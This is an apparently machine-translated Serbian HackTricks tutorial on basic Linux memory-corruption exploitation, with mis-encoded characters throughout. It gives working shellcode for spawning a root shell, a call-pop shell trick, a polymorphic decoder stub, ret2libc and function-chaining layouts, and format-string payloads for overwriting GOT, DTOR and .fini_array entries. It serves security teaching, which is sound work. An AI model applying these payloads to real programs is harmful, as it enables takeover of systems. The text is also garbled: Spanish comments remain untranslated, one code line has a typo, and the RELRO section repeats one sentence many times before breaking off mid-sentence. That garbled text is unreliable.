# Linux Exploiting (Osnovno)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **1. PREKORAÄŒENJE STOGA**

> prekoraÄenje bafera, prekoraÄenje stoga, prekoraÄenje steka, stekovanje

Segmentation fault ili segment violation: Kada se pokuÅ¡a pristupiti adresi memorije koja nije dodeljena procesu.

Za dobijanje adrese funkcije unutar programa moÅ¾e se uraditi:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Poziv funkcije sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Pogledajte prekide kernela: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; Äistimo eax\
xor ebx, ebx ; ebx = 0 jer nema argumenata za prosleÄ‘ivanje\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; IzvrÅ¡avanje syscall-a

**nasm -f elf assembly.asm** â€”> VraÄ‡a .o datoteku\
**ld assembly.o -o shellcodeout** â€”> Daje nam izvrÅ¡nu datoteku sastavljenu od asemblerskog koda i moÅ¾emo izvuÄ‡i opkodove pomoÄ‡u **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> Da bismo videli da je zaista naÅ¡ shellcode i izvukli OpKodove

**Proverite da li shellcode radi**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Da biste videli da li se sistemski pozivi pravilno izvrÅ¡avaju, treba da kompajlirate prethodni program i sistemski pozivi treba da se pojave u **strace ./PROGRAMA\_COMPILADO**

Prilikom kreiranja shellcode-ova moÅ¾ete koristiti trik. Prva instrukcija je skok na poziv. Poziv poziva originalni kod i dodatno stavlja EIP na stek. Nakon instrukcije poziva smo ubacili string koji nam je potreban, tako da sa tim EIP-om moÅ¾emo pokazati na string i nastaviti izvrÅ¡avanje koda.

PRIMER **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**EKSPLOATISANJE koriÅ¡Ä‡enjem Stack-a (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Lovac na jaja:**

Ovo je mali kod koji prolazi kroz stranice memorije povezane s procesom u potrazi za shellcode-om koji je tamo spremljen (traÅ¾i neki potpis postavljen u shellcode-u). Korisno u sluÄajevima kada imate samo malo prostora za ubacivanje koda.

**Polimorfni shellkodovi**

To su Å¡ifrovani shellkodovi koji imaju male kodove koji ih deÅ¡ifruju i skoÄe na njih, koristeÄ‡i trik Call-Pop, ovde je **primer Cezarove Å¡ifre**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
1. **Napad na pokazivaÄ okvira (EBP)**

Koristan u situaciji kada moÅ¾emo izmeniti EBP, ali ne i EIP.

Poznato je da prilikom izlaska iz funkcije izvrÅ¡ava sledeÄ‡i asemblerski kod:
```
movl               %ebp, %esp
popl                %ebp
ret
```
Na ovaj naÄin, ako se moÅ¾e promeniti EBP prilikom izlaska iz funkcije (fvuln) koja je pozvana iz druge funkcije, kada funkcija koja je pozvala fvuln zavrÅ¡i, njen EIP moÅ¾e biti promenjen.

U fvuln se moÅ¾e uneti laÅ¾ni EBP koji pokazuje na mesto gde se nalazi adresa shell koda + 4 (treba dodati 4 zbog pop operacije). Na taj naÄin, prilikom izlaska iz funkcije, vrednost &(\&Shellcode)+4 Ä‡e biti smeÅ¡tena u ESP, nakon pop operacije Ä‡e se smanjiti vrednost ESP za 4 i on Ä‡e pokazivati na adresu shell koda kada se izvrÅ¡i ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + punjenje + &(\&Shellcode)+4

**Off-by-One Exploit**\
Dozvoljava se modifikacija samo najmanjeg bajta EBP. MoÅ¾e se izvesti napad kao prethodni, ali memorija koja Äuva adresu shell koda mora deliti prva 3 bajta sa EBP.

## **4. Metode povratka na Libc**

Korisna metoda kada stack nije izvrÅ¡iv ili ostavlja vrlo mali bafer za modifikaciju.

ASLR uzrokuje da se funkcije u svakom izvrÅ¡avanju uÄitavaju na razliÄite pozicije u memoriji. Stoga ova metoda moÅ¾da neÄ‡e biti efikasna u tom sluÄaju. Za udaljene servere, buduÄ‡i da se program stalno izvrÅ¡ava na istoj adresi, ova metoda moÅ¾e biti korisna.

* **cdecl(C deklaracija)** Stavlja argumente na stack i nakon izlaska iz funkcije Äisti stek
* **stdcall(standardni poziv)** Stavlja argumente na stek i funkcija koja je pozvana Äisti stek
* **fastcall** Stavlja prva dva argumenta u registre, a ostale na stek

Stavlja se adresa system funkcije iz libc i prosleÄ‘uje se kao argument string â€œ/bin/shâ€, obiÄno iz okoline. TakoÄ‘e, koristi se adresa funkcije exit kako bi se program izaÅ¡ao bez problema nakon Å¡to shell viÅ¡e nije potreban (i zapisivanje logova).

**export SHELL=/bin/sh**

Za pronalaÅ¾enje potrebnih adresa moÅ¾e se pogledati unutar **GDB-a:**\
**p system**\
**p exit**\
**rabin2 -i izvrÅ¡iv** â€”> Daje adresu svih funkcija koje program koristi prilikom uÄitavanja\
(Unutar starta ili nekog breakpointa): **x/500s $esp** â€”> TraÅ¾imo string /bin/sh unutar ovoga

Kada imamo ove adrese, **exploit** Ä‡e izgledati ovako:

â€œAâ€ \* RAZDALJINA EBP + 4 (EBP: mogu biti 4 "A" mada je bolje ako je pravi EBP da se izbegnu segmentacione greÅ¡ke) + Adresa **system** (prepisuje EIP) + Adresa **exit** (nakon system(â€œ/bin/shâ€) ova funkcija Ä‡e biti pozvana jer se prva 4 bajta steka tretiraju kao sledeÄ‡a adresa EIP-a za izvrÅ¡avanje) + Adresa â€œ**/bin/sh**â€ (biÄ‡e parametar prosleÄ‘en system funkciji)

Na ovaj naÄin, EIP Ä‡e biti prepisan adresom system funkcije koja Ä‡e primiti string â€œ/bin/shâ€ kao argument, a nakon izlaska iz nje izvrÅ¡iÄ‡e se funkcija exit().

MoguÄ‡e je da se naÄ‘ete u situaciji da je neki bajt neke adrese neaktivan ili prazan (\x20). U tom sluÄaju moÅ¾ete rasklopiti prethodne adrese funkcija jer Ä‡e verovatno biti viÅ¡e NOP instrukcija koje Ä‡e vam omoguÄ‡iti da pozovete neku od njih umesto same funkcije direktno (na primer sa > x/8i system-4).

Ova metoda funkcioniÅ¡e jer kada se pozove funkcija poput system koristeÄ‡i opcode **ret** umesto **call**, funkcija shvata da Ä‡e prva 4 bajta biti adresa **EIP** na koju treba vratiti.

Interesantna tehnika sa ovom metodom je pozivanje **strncpy()** kako bi se prebacio payload sa steka na hip i zatim koristio **gets()** za izvrÅ¡avanje tog payload-a.

JoÅ¡ jedna interesantna tehnika je koriÅ¡Ä‡enje **mprotect()** koja omoguÄ‡ava dodeljivanje Å¾eljenih dozvola bilo kojem delu memorije. FunkcioniÅ¡e ili je funkcionisalo u BDS-u, MacOS-u i OpenBSD-u, ali ne i u Linuxu (kontroliÅ¡e da ne moÅ¾ete istovremeno dodeliti dozvole za pisanje i izvrÅ¡avanje). Ovim napadom moglo bi se ponovo postaviti stek kao izvrÅ¡iv.

**Nizanje funkcija**

Na osnovu prethodne tehnike, ovaj oblik exploit-a sastoji se od:\
Punjenje + \&Funkcija1 + \&pop;ret; + \&arg\_fun1 + \&Funkcija2 + \&pop;ret; + \&arg\_fun2 + â€¦

Na ovaj naÄin mogu se nizati funkcije koje treba pozvati. TakoÄ‘e, ako se Å¾ele koristiti funkcije sa viÅ¡e argumenata, mogu se postaviti potrebni argumenti (npr. 4) i postaviti sva 4 argumenta i pronaÄ‡i adresu sa opcodovima: pop, pop, pop, pop, ret â€”> **objdump -d izvrÅ¡iv**

**Nizanje putem falsifikovanja okvira (nizanje EBPa)**

Sastoji se u iskoriÅ¡Ä‡avanju moguÄ‡nosti manipulacije EBP-om kako bi se nizale izvrÅ¡avanje razliÄitih funkcija putem EBP-a i "leave;ret"

PUNJENJE

* Postavljamo laÅ¾ni EBP koji pokazuje na: 2. laÅ¾ni EBP + funkcija za izvrÅ¡avanje: (\&system() + \&leave;ret + &â€œ/bin/shâ€)
* U EIP postavljamo adresu funkcije &(leave;ret)

ZapoÄinjemo shell kod sa adresom sledeÄ‡eg dela shell koda, na primer: 2. laÅ¾ni EBP + \&system() + &(leave;ret;) + &â€/bin/shâ€

2. laÅ¾ni EBP bi bio: 3. laÅ¾ni EBP + \&system() + &(leave;ret;) + &â€/bin/lsâ€

Ovaj shell kod se moÅ¾e ponavljati neograniÄeno u delovima memorije do kojih se moÅ¾e pristupiti, tako da Ä‡e se shell kod lako podeliti na male delove memorije.

(IzvrÅ¡avanje funkcija se niza kombinovanjem ranije viÄ‘enih ranjivosti EBP-a i ret2lib)

## **5. Dodatne metode**

**Ret2Ret**

Korisno kada nije moguÄ‡e ubaciti adresu sa steka u EIP (proverava se da EIP ne sadrÅ¾i 0xbf) ili kada nije moguÄ‡e izraÄunati lokaciju shell koda. MeÄ‘utim, ranjiva funkcija prihvata parametar (shell kod Ä‡e biti ovde).

Na ovaj naÄin, menjanjem EIP-a sa adresom **ret**, uÄitaÄ‡e se sledeÄ‡a adresa (koja je adresa prvog argumenta funkcije). Drugim reÄima, uÄitaÄ‡e se shell kod.

Exploit Ä‡e izgledati ovako: SHELLCODE + Punjenje (do EIP-a) + **\&ret** (sledeÄ‡i bajtovi steka pokazuju na poÄetak shell koda jer se adresa prosleÄ‘uje kao argument)

Izgleda da funkcije poput **strncpy** nakon zavrÅ¡etka uklanjaju sa steka adresu gde je Äuvan shell kod, onemoguÄ‡avajuÄ‡i ovu tehniku. Drugim reÄima, adresa koja se prosleÄ‘uje funkciji kao argument (ona koja Äuva shell kod) se menja u 0x00, pa kada se pozove drugi **ret** nailazi se na 0x00 i program se ruÅ¡i.
```
**Ret2PopRet**
```
**Muratova tehnika**

Ukoliko nemamo kontrolu nad prvom argumentom, ali imamo nad drugim ili treÄ‡im, moÅ¾emo prepisati EIP adresu sa adresom pop-ret ili pop-pop-ret, u zavisnosti koja nam je potrebna.

U Linuxu, svi programi se mapiraju poÄevÅ¡i od 0xbfffffff.

PosmatrajuÄ‡i kako se konstruiÅ¡e stek novog procesa u Linuxu, moÅ¾emo razviti eksploit tako da program bude pokrenut u okruÅ¾enju gde je jedina promenljiva shellcode. Adresu ove promenljive moÅ¾emo izraÄunati kao: addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)

Na ovaj naÄin, lako moÅ¾emo dobiti adresu gde se nalazi promenljiva okruÅ¾enja sa shellcode.

Ovo je moguÄ‡e zahvaljujuÄ‡i funkciji execle koja omoguÄ‡ava kreiranje okruÅ¾enja sa samo Å¾eljenim promenljivama okruÅ¾enja.

**Skok na ESP: Windows stil**

BuduÄ‡i da ESP uvek pokazuje na poÄetak steka, ova tehnika podrazumeva zamenu EIP adrese sa adresom poziva **jmp esp** ili **call esp**. Na ovaj naÄin, shellcode se Äuva nakon prepisivanja EIP jer nakon izvrÅ¡enja **ret**, ESP Ä‡e pokazivati na sledeÄ‡u adresu, taÄno tamo gde je saÄuvana shellcode.

U sluÄaju da ASLR nije aktiviran u Windowsu ili Linuxu, moÅ¾emo pozvati **jmp esp** ili **call esp** koji su smeÅ¡teni u nekom deljenom objektu. U sluÄaju da je ASLR aktivan, moÅ¾emo potraÅ¾iti unutar samog ranjivog programa.

TakoÄ‘e, moguÄ‡nost postavljanja shellcode nakon korupcije EIP umesto u sredini steka omoguÄ‡ava da push ili pop instrukcije koje se izvrÅ¡e usred funkcije ne dodirnu shellcode (Å¡to bi se moglo desiti ako bi bila postavljena u sredini steka funkcije).

Na veoma sliÄan naÄin, ako znamo da funkcija vraÄ‡a adresu gde je saÄuvana shellcode, moÅ¾emo pozvati **call eax** ili **jmp eax (ret2eax).**

**PrekoraÄenja celih brojeva**

Ova vrsta prekoraÄenja se deÅ¡ava kada promenljiva nije spremna da podrÅ¾i tako veliki broj koji joj se prosleÄ‘uje, moÅ¾da zbog zabune izmeÄ‘u promenljivih sa i bez znaka, na primer:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
U prethodnom primeru vidimo da program oÄekuje 2 parametra. Prvi je duÅ¾ina sledeÄ‡eg niza, a drugi je niz.

Ako prosledimo negativan broj kao prvi parametar, program Ä‡e prikazati da je len < 256 i proÄ‡i Ä‡e kroz taj filter, a takoÄ‘e Ä‡e strlen(buffer) biti manji od l, jer je l unsigned int i biÄ‡e veoma velik.

Ovaj tip preplavljenosti ne pokuÅ¡ava da neÅ¡to upiÅ¡e u proces programa, veÄ‡ da prevaziÄ‘e loÅ¡e dizajnirane filtere kako bi iskoristio druge ranjivosti.

**Nekonfigurisane promenljive**

Nije poznata vrednost koju moÅ¾e imati nekonfigurisana promenljiva i bilo bi zanimljivo posmatrati je. MoguÄ‡e je da Ä‡e uzeti vrednost koju je imala promenljiva iz prethodne funkcije i da je ova kontrolisana od strane napadaÄa.

## **Formatiranje stringova**

U programskom jeziku C, **`printf`** je funkcija koja se moÅ¾e koristiti za **ispisivanje** odreÄ‘enog niza karaktera. **Prvi parametar** koji ova funkcija oÄekuje je **sirovi tekst sa formatima**. **SledeÄ‡i parametri** koji se oÄekuju su **vrednosti** koje Ä‡e **zameniti** formate iz sirovog teksta.

Ranjivost se pojavljuje kada **napadaÄev tekst bude postavljen kao prvi argument** ovoj funkciji. NapadaÄ Ä‡e moÄ‡i da oblikuje **specijalan unos zloupotrebom** moguÄ‡nosti **formatiranja stringova printf funkcije** kako bi **upisao bilo koje podatke na bilo koju adresu**. Na taj naÄin moÅ¾e **izvrÅ¡iti proizvoljan kod**.

Formati:
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**`%n`** **upisuje** **broj napisanih bajtova** na **naznaÄenu adresu. Pisanje** toliko **bajtova** koliko je heksadecimalni broj koji **treba** napisati je naÄin kako moÅ¾ete **napisati bilo koje podatke**.
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

Ovo je tabela koja sadrÅ¾i adresu spoljnih funkcija koje koristi program.

Dobijte adresu ove tabele sa: `objdump -s -j .got ./exec`

![](<../../.gitbook/assets/image (619).png>)

Primetite kako nakon uÄitavanja izvrÅ¡nog fajla u GEF-u moÅ¾ete videti funkcije koje se nalaze u GOT-u: `gefâ¤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

KoriÅ¡Ä‡enjem GEF-a moÅ¾ete zapoÄeti sesiju za debagovanje i izvrÅ¡iti `got` da biste videli got tabelu:

![](<../../.gitbook/assets/image (621).png>)

U binarnom fajlu, GOT ima adrese funkcija ili odeljak PLT koji Ä‡e uÄitati adresu funkcije. Cilj ovog eksploata je da se prepiÅ¡e unos u GOT-u funkcije koja Ä‡e biti izvrÅ¡ena kasnije sa adresom PLT funkcije `system`. Idealno, prepiÅ¡ete GOT funkcije koja Ä‡e biti pozvana sa parametrima koje kontroliÅ¡ete (tako da Ä‡ete moÄ‡i da kontroliÅ¡ete parametre poslate funkciji sistema).

Ako `system` nije koriÅ¡Ä‡en od strane skripte, funkcija sistema neÄ‡e imati unos u GOT-u. U tom scenariju, moraÄ‡ete prvo otkriti adresu funkcije `system`.

Procedure Linkage Table je tabela samo za Äitanje u ELF fajlu koja Äuva sve neophodne simbole koji zahtevaju razreÅ¡enje. Kada se pozove jedna od ovih funkcija, GOT Ä‡e preusmeriti tok na PLT kako bi razreÅ¡io adresu funkcije i upisao je u GOT. Zatim, sledeÄ‡i put kada se pozove ta adresa, funkcija se poziva direktno bez potrebe za razreÅ¡avanjem.

MoÅ¾ete videti adrese PLT-a sa `objdump -j .plt -d ./vuln_binary`

### Tok eksploatacije

Kao Å¡to je objaÅ¡njeno ranije, cilj Ä‡e biti da se prepiÅ¡e adresa funkcije u GOT tabeli koja Ä‡e biti pozvana kasnije. Idealno bi bilo postaviti adresu shell koda smeÅ¡tenu u izvrÅ¡nom odeljku, ali je veoma verovatno da neÄ‡ete moÄ‡i da napiÅ¡ete shell kod u izvrÅ¡nom odeljku. Stoga, druga opcija je da se prepiÅ¡e funkcija koja prima argumente od korisnika i usmeri je ka funkciji `system`.

Za pisanje adrese, obiÄno se rade 2 koraka: Prvo se piÅ¡u 2 bajta adrese, a zatim druga 2. Za to se koristi `$hn`.

HOB se odnosi na 2 viÅ¡a bajta adrese\
LOB se odnosi na 2 niÅ¾a bajta adrese

Zbog toga kako format string radi, morate prvo napisati manji od [HOB, LOB] pa onda drugi.

Ako je HOB < LOB\
`[adresa+2][adresa]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Ako je HOB > LOB\
`[adresa+2][adresa]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 NÂºParam_dir_HOB LOB_shell-HOB_shell NÂºParam_dir_LOB

`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'`

### Å ablon za eksploataciju format stringa

MoÅ¾ete pronaÄ‡i Å¡ablon za eksploataciju GOT-a koriÅ¡Ä‡enjem format stringova ovde:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### .fini_array

Essentially this is a structure with functions that will be called before the program finishes. This is interesting if you can call your shellcode just jumping to an address, or in cases where you need to go back to main again to exploit the format string a second time.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Napomena da ovo **neÄ‡e** **kreirati** veÄnu petlju jer kada se vratite na glavnu funkciju, kanarinci Ä‡e primetiti, kraj steka moÅ¾e biti oÅ¡teÄ‡en i funkcija viÅ¡e neÄ‡e biti ponovo pozvana. Dakle, sa ovim Ä‡ete moÄ‡i **izvrÅ¡iti joÅ¡ jedno izvrÅ¡enje** ranjivosti.

### **Formatiranje stringova za ispis sadrÅ¾aja**

Formatni string takoÄ‘e moÅ¾e biti zloupotrebljen da **izbaci sadrÅ¾aj** iz memorije programa. Na primer, u sledeÄ‡oj situaciji postoji **lokalna promenljiva na steku koja pokazuje na zastavu**. Ako **pronaÄ‘ete** gde je u **memoriji** **pokazivaÄ** na **zastavu**, moÅ¾ete naterati **printf da pristupi** tom **adresi** i **ispise** zastavu:

Dakle, zastava je na **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Iz curenja moÅ¾ete videti da je **pokazivaÄ na zastavu** u **8.** parametru:

![](<../../.gitbook/assets/image (623).png>)

Dakle, **pristupanjem 8. parametru** moÅ¾ete dobiti zastavu:

![](<../../.gitbook/assets/image (624).png>)

Napomena da nakon **prethodnog napada** i shvatanja da moÅ¾ete **procureti sadrÅ¾aj**, moÅ¾ete postaviti pokazivaÄe na **`printf`** na odeljak gde je **izvrÅ¡ivi fajl uÄitan** i **potpuno ga iskopirati**!

### **DTOR**

{% hint style="danger" %}
Danas je vrlo **Äudno naÄ‡i binarni fajl sa dtor sekcijom**.
{% endhint %}

Destruktori su funkcije koje se **izvrÅ¡avaju pre zavrÅ¡etka programa**. Ako uspete **upisati** adresu **shell koda** u **`__DTOR_END__`**, to Ä‡e se **izvrÅ¡iti** pre zavrÅ¡etka programa. Dobijte adresu ovog odeljka sa:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep â€œ__DTORâ€
```
ObiÄno Ä‡ete pronaÄ‡i **DTOR** sekciju **izmeÄ‘u** vrednosti `ffffffff` i `00000000`. Dakle, ako vidite samo te vrednosti, to znaÄi da **nema registrovane funkcije**. Dakle, **prepiÅ¡ite** **`00000000`** sa **adresom** **shell koda** da biste ga izvrÅ¡ili.

### **Formatiranje stringova za preplavljivanje bafera**

**Sprintf** pomera formatiran string **u** **promenljivu**. Stoga, moÅ¾ete zloupotrebiti **formatiranje** stringa da izazovete **preplavljivanje bafera u promenljivoj** gde se sadrÅ¾aj kopira. Na primer, payload `%.44xAAAA` Ä‡e **upisati 44B+"AAAA" u promenljivu**, Å¡to moÅ¾e izazvati preplavljivanje bafera.

### **Strukture \_\_atexit**

{% hint style="danger" %}
Danas je vrlo **Äudno iskoristiti ovo**.
{% endhint %}

**`Atexit()`** je funkcija kojoj se **druge funkcije prosleÄ‘uju kao parametri.** Ove **funkcije** Ä‡e biti **izvrÅ¡ene** prilikom izvrÅ¡avanja **`exit()`** ili **povratka** iz **main** funkcije. Ako moÅ¾ete **modifikovati adresu** bilo koje od ovih **funkcija** da pokazuje na shell kod na primer, **preuzeti Ä‡ete kontrolu** nad **procesom**, ali je to trenutno sloÅ¾enije. Trenutno su **adrese funkcija** koje treba izvrÅ¡iti **sakrivene** iza nekoliko struktura i na kraju adrese na koje pokazuju nisu adrese funkcija, veÄ‡ su **Å¡ifrovane XOR** funkcijom i pomeraji sa **sluÄajnim kljuÄem**. Tako da je ovaj vektor napada trenutno **nije vrlo koristan bar na x86** i **x64\_86** arhitekturama. **Funkcija za Å¡ifrovanje** je **`PTR_MANGLE`**. **Druge arhitekture** poput m68k, mips32, mips64, aarch64, arm, hppa... **ne implementiraju Å¡ifrovanje** funkcije jer **vraÄ‡aju isto** Å¡to su primile kao ulaz. Tako da bi ove arhitekture bile podloÅ¾ne ovom vektoru napada.

### **Setjmp() & longjmp()**

{% hint style="danger" %}
Danas je vrlo **Äudno iskoristiti ovo**.
{% endhint %}

**`Setjmp()`** omoguÄ‡ava da se **saÄuva** **kontekst** (registri)\
**`Longjmp()`** omoguÄ‡ava da se **vrati** **kontekst**.\
SaÄuvani registri su: `EBX, ESI, EDI, ESP, EIP, EBP`\
Ono Å¡to se deÅ¡ava je da se EIP i ESP prosleÄ‘uju kroz **`PTR_MANGLE`** funkciju, tako da su **arhitekture podloÅ¾ne ovom napadu iste kao gore**.\
Koriste se za oporavak od greÅ¡aka ili prekida.\
MeÄ‘utim, prema onome Å¡to sam proÄitao, ostali registri nisu zaÅ¡tiÄ‡eni, **tako da ako postoji `call ebx`, `call esi` ili `call edi`** unutar funkcije koja se poziva, kontrola moÅ¾e biti preuzeta. Ili takoÄ‘e moÅ¾ete modifikovati EBP da biste modifikovali ESP.

**VTable i VPTR u C++**

Svaka klasa ima **Vtabelu** koja je niz **pokazivaÄa na metode**.

Svaki objekat **klase** ima **VPtr** koji je **pokazivaÄ** na niz svoje klase. VPtr je deo zaglavlja svakog objekta, tako da ako se postigne **prepisivanje** VPtr-a, moÅ¾e se **modifikovati** da **pokazuje** na laÅ¾nu metodu tako da izvrÅ¡avanje funkcije ode na shell kod.

## **Preventivne mere i izbegavanja**

**Return-into-printf**

To je tehnika za pretvaranje preplavljivanja bafera u greÅ¡ku u formatu stringa. Sastoji se od zamene EIP-a tako da pokazuje na printf funkciju i prosleÄ‘ivanja manipulisanog stringa kao argumenta kako bi se dobile vrednosti o stanju procesa.

**Napad na biblioteke**

Biblioteke se nalaze na poziciji sa 16 bita nasumiÄnosti = 65636 moguÄ‡ih adresa. Ako ranjiv server pozove fork(), prostor adresa memorije je kopiran u proces dete i ostaje netaknut. Tako da se moÅ¾e pokuÅ¡ati izvrÅ¡iti brute force na funkciju usleep() iz libc prosleÄ‘ujuÄ‡i joj argument "16" tako da kada duÅ¾e traje od uobiÄajenog da odgovori, pronaÄ‘ena je ta funkcija. ZnajuÄ‡i gde se ta funkcija nalazi, moÅ¾e se dobiti delta\_mmap i izraÄunati ostale.

Jedini naÄin da budete sigurni da ASLR funkcioniÅ¡e je koriÅ¡Ä‡enje 64-bitne arhitekture. Tamo nema napada brute force.

### Relro

**Relro (Read only Relocation)** utiÄe na dozvole memorije sliÄno kao NX. Razlika je u tome Å¡to dok sa NX Äini stek izvrÅ¡ivim, RELRO Äini **odreÄ‘ene stvari samo za Äitanje** tako da im **ne moÅ¾emo pisati**. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje 